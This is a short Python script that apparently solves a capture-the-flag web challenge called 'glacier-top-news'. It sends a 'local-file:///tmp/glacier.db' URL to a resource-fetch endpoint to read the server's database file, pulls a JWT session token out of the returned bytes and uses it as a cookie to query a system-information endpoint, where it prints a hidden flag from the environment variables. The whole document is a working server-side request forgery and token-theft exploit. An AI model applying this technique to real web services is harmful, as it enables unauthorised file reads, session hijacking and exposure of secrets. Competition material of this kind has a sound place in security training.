import requests
import sys
import string
import re


def main() -> int:
    remote_base_url: str = "https://glacier-top-news.ctf.glacierctf.com"

    sys.stdout.write("Requesting resources ... ")
    response = requests.post(
        url=f"{remote_base_url}/api/get_resource",
        json={"url": "local-file:///tmp/glacier.db"}
    )
    sys.stdout.write("requested!\n")

    jwt = (
        "".join(
            filter(
                lambda x: x in string.printable,
                response.text.rpartition("\0")[2].strip()
            )
        ).strip()
    )

    sys.stdout.write("Requesting system infos ... ")
    response = requests.post(
        url=f"{remote_base_url}/api/system_info",
        cookies={
            "token": jwt
        }
    )
    sys.stdout.write("requested!\n")

    print(f'Flag: {response.json()["environment"]["WERKZEUG_HIDDEN_FLAG"]}')

    return 0


if __name__ == "__main__":
    raise SystemExit(main())
